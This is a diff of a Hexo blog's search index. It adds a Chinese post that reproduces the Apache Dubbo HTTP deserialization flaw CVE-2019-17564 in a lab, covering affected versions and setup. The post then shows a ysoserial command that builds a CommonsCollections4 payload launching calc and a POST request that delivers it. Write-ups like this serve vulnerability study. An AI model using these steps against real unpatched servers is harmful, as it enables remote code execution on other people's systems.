@@ -4,13 +4,29 @@
   
     
     <entry>
-      <title>Hello World</title>
-      <link href="/2020/02/03/hello-world/"/>
-      <url>/2020/02/03/hello-world/</url>
+      <title>Apache Dubbo反序列化漏洞复现(CVE-2019-17564)</title>
+      <link href="/2020/02/14/apache-dubbo-deserialization-vulnerability-cve-2019-17564/"/>
+      <url>/2020/02/14/apache-dubbo-deserialization-vulnerability-cve-2019-17564/</url>
       
-        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-漏洞详情"><a href="#0x00-漏洞详情" class="headerlink" title="0x00 漏洞详情"></a>0x00 漏洞详情</h1><p><code>CVE-2019-17564</code>是Apache Dubbo HTTP协议中的一个反序列化漏洞,该漏洞的主要原因在于当<code>Apache Dubbo</code>启用HTTP协议之后，<code>Apache Dubbo</code>在接受来自消费者的远程调用请求的时候存在一个不安全的反序列化行为，当项目包中存在可用的<code>gadgets</code>时即可导致远程代码执行。</p><h1 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h1><ul><li><p>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4</p></li><li><p>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</p></li><li><p>Apache Dubbo = 2.5.x </p></li></ul><h1 id="0x02漏洞复现"><a href="#0x02漏洞复现" class="headerlink" title="0x02漏洞复现"></a>0x02漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>JDK 1.8</li><li>Zookeeper</li></ul><p>Dubbo启动依赖zookeeper</p><p>win10安装</p><p>下载 <a href="https://archive.apache.org/dist/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz" target="_blank" rel="noopener">Zookeeper</a></p><p>解压后将conf目录下的zoo_sample.cfg文件更名为zoo.cfg</p><p>直接在命令行中运行bin目录下的zkServer.cmd就可以了</p><ul><li>Dubbo-samples-http</li></ul><p><a href="https://github.com/apache/dubbo-samples" target="_blank" rel="noopener">下载源码</a></p><p>http部分导入idea</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/img/20200214160509.png" alt></p><p>修改pom.xml中32行<code>dubbo.version</code>为2.7.1</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/img/20200214160750.png" alt></p><p>导入一个可控的gadgets,例如<code>commons-collections4-4.0</code></p><p>启动``Zookeeper<code>和</code>HttpProvider`</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/img/20200214161003.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用<code>ysoserial</code>生成payload</p><p><code>java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections4 calc &gt; 1.ser</code></p><p>burp导入生成的payload 发送</p><pre><code>POST /org.apache.dubbo.samples.http.api.DemoService HTTP/1.1 Host: 192.168.0.102:8080 &lt;ysoserial生成的payload&gt;</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/img/20200214161504.png" alt></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://qiita.com/shimizukawasaki/items/39c9695d439768cfaeb5" target="_blank" rel="noopener">[漏洞分析]CVE-2019-17564/Apache Dubbo存在反序列化漏洞 </a></p><p><a href="https://blog.csdn.net/caiqiiqi/article/details/104279860" target="_blank" rel="noopener">[CVE-2019-17564] Apache Dubbo deserialization vulnerability_caiqiiqi</a></p>]]></content>
       
       
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Apache Dubbo </tag>
+            
+            <tag> Deserialization </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -182,11 +198,11 @@
       
         <tags>
             
+            <tag> 漏洞复现 </tag>
+            
             <tag> Apache Flink </tag>
             
             <tag> RCE </tag>
-            
-            <tag> 漏洞复现 </tag>
             
         </tags>
       
@@ -358,9 +374,9 @@
       
         <tags>
             
-            <tag> RCE </tag>
-            
             <tag> 漏洞复现 </tag>
+            
+            <tag> RCE </tag>
             
             <tag> solr </tag>
             
@@ -447,9 +463,9 @@
       
         <tags>
             
-            <tag> RCE </tag>
-            
             <tag> 漏洞复现 </tag>
+            
+            <tag> RCE </tag>
             
             <tag> PHP </tag>
             
@@ -480,9 +496,9 @@
       
         <tags>
             
-            <tag> RCE </tag>
-            
             <tag> 漏洞复现 </tag>
+            
+            <tag> RCE </tag>
             
             <tag> kibana </tag>
             
@@ -602,9 +618,9 @@
       
         <tags>
             
-            <tag> RCE </tag>
-            
             <tag> 漏洞复现 </tag>
+            
+            <tag> RCE </tag>
             
             <tag> phpstudy </tag>
             
